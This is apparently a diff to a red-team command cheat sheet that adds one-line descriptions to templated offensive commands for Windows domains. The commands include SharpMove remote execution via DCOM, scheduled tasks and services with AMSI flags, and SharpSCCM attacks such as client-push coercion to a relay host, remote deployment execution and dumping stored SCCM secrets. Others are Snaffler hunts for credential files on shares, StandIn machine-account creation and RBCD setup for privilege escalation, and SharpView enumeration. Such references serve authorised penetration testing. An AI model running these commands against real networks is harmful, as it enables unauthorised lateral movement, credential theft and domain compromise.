@@ -6,6 +6,8 @@
 
 Execute DCOM execution with Sharp Tools.
 
+Execute a command through a DCOM method.
+
 ```cmd title:"Sharp Tools Execute DCOM Execution"
 SharpMove.exe action=dcom computername=$rhost_name command="$command" method=$dcom_method amsi=true
 ```
@@ -18,6 +20,8 @@ var dcom_method = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --heade
 ### Task Scheduler execution
 
 Execute task scheduler execution with Sharp Tools.
+
+Create and run a remote scheduled task.
 
 ```cmd title:"Sharp Tools Execute Task Scheduler Execution"
 SharpMove.exe action=taskscheduler computername=$rhost_name command="$command" taskname=$task_name amsi=true username=$domain\$user password=$pass
@@ -35,6 +39,8 @@ var pass
 
 Execute service execution with Sharp Tools.
 
+Modify and start a remote service.
+
 ```cmd title:"Sharp Tools Execute Service Execution"
 SharpMove.exe action=modsvc computername=$rhost_name command="$command" amsi=true servicename=$service_name
 ```
@@ -50,6 +56,8 @@ var service_name
 
 Enumerate SCCM administrators with Sharp Tools.
 
+Enumerate SCCM administrative users through the SMS Provider.
+
 ```powershell title:"Sharp Tools Enumerate SCCM Administrators"
 .\SharpSCCM.exe get class-instances SMS_ADMIN
 ```
@@ -58,6 +66,8 @@ Enumerate SCCM administrators with Sharp Tools.
 ### Get resource ID
 
 Get resource ID with Sharp Tools.
+
+Resolve a device resource ID for AdminService or deployment operations.
 
 ```powershell title:"Sharp Tools Get Resource ID"
 .\SharpSCCM.exe get resource-id -d "$computer_name"
@@ -69,6 +79,8 @@ var computer_name
 ### Trigger client push coercion
 
 Trigger client push coercion with Sharp Tools.
+
+Coerce SCCM client push authentication toward a relay host.
 
 ```powershell title:"Sharp Tools Trigger Client Push Coercion"
 .\SharpSCCM.exe invoke client-push -mp "$mp_fqdn" -sc "$site_code" -t "$relay_host"
@@ -83,6 +95,8 @@ var relay_host
 
 Execute deployment with Sharp Tools.
 
+Trigger execution against a device resource.
+
 ```powershell title:"Sharp Tools Execute Deployment"
 .\SharpSCCM.exe exec -rid $resource_id -r "$target"
 ```
@@ -95,6 +109,8 @@ var target
 
 Dump local SCCM secrets with Sharp Tools.
 
+Dump locally stored SCCM secrets from disk.
+
 ```powershell title:"Sharp Tools Dump Local SCCM Secrets"
 .\SharpSCCM.exe local secrets disk
 ```
@@ -105,6 +121,8 @@ Dump local SCCM secrets with Sharp Tools.
 ### Domain share hunt
 
 Run domain share hunt with Sharp Tools.
+
+Search domain shares for sensitive files and likely credential material.
 
 ```powershell title:"Sharp Tools Run Domain Share Hunt"
 .\Snaffler.exe -d "$domain" -c -s
@@ -117,6 +135,8 @@ var domain
 
 List host list share hunt with Sharp Tools.
 
+Search a provided host list.
+
 ```powershell title:"Sharp Tools List Host List Share Hunt"
 .\Snaffler.exe -n "$hosts" -s
 ```
@@ -127,6 +147,8 @@ var hosts
 ### Directory hunt
 
 Run directory hunt with Sharp Tools.
+
+Search a specific share or directory path.
 
 ```powershell title:"Sharp Tools Run Directory Hunt"
 .\Snaffler.exe -i "$path" -s
@@ -141,6 +163,8 @@ var path
 
 Read MachineAccountQuota with Sharp Tools.
 
+Read the domain MachineAccountQuota value.
+
 ```cmd title:"Sharp Tools Read MachineAccountQuota"
 StandIn.exe --object ms-DS-MachineAccountQuota=*
 ```
@@ -149,6 +173,8 @@ StandIn.exe --object ms-DS-MachineAccountQuota=*
 ### Add machine account
 
 Add machine account with Sharp Tools.
+
+Create a machine account for RBCD or shadow credential chains.
 
 ```cmd title:"Sharp Tools Add Machine Account"
 StandIn.exe --computer "$computer_name" --make --password "$computer_pass"
@@ -161,6 +187,8 @@ var computer_pass
 ### Set RBCD
 
 Set RBCD with Sharp Tools.
+
+Configure RBCD from a controlled computer to a target computer.
 
 ```cmd title:"Sharp Tools Set RBCD"
 StandIn.exe --computer "$target_computer" --sid "$controlled_computer_sid"
@@ -176,6 +204,8 @@ var controlled_computer_sid
 
 Enumerate domain user with Sharp Tools.
 
+Query a domain user with SharpView.
+
 ```powershell title:"Sharp Tools Enumerate Domain User"
 .\SharpView.exe Get-DomainUser -Identity "$user"
 ```
@@ -186,6 +216,8 @@ var user
 ### Object ACL
 
 Enumerate object ACL with Sharp Tools.
+
+Resolve ACLs on an AD object.
 
 ```powershell title:"Sharp Tools Enumerate Object ACL"
 .\SharpView.exe Get-ObjectAcl -Identity "$target_object" -ResolveGUIDs
